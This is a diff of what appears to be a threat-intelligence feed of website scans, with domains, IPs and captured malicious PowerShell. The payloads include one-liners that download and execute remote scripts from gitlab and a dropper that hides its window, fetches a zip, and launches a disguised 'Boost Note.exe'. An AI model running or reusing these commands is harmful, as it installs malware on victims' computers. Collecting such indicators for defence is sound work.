@@ -1,5 +1,51 @@
 [
   {
+    "UrlDomain": "balifusarongs.com",
+    "DeliveryUrl": [
+      "biboiboboorl.org"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.136.163"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
+    ],
+    "ReportId": "cmwijm8za0zxz0omlgbyn6tef",
+    "ScannedAt": "2026-11-16T00:46:26.607000+00:00"
+  },
+  {
+    "UrlDomain": "exploratlantico.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "147.93.42.88"
+    ],
+    "Related": [
+      {
+        "Value": "https://fbifr.com/ca.js",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwijlxrh0zwy0omlmlk3hhqx",
+    "ScannedAt": "2026-11-16T00:46:11.976000+00:00"
+  },
+  {
     "UrlDomain": "hospitaldebertioga.com.br",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -1630,25 +1676,5 @@
     ],
     "ReportId": "cmwfpwgss0ihy0omlygayvwid",
     "ScannedAt": "2026-11-14T01:19:02.441000+00:00"
-  },
-  {
-    "UrlDomain": "update.sportela.bg",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "78.142.63.182"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
-    ],
-    "ReportId": "cmwfo93tk0gqe0oml1kpi8kea",
-    "ScannedAt": "2026-11-14T00:32:52.943000+00:00"
   }
 ]
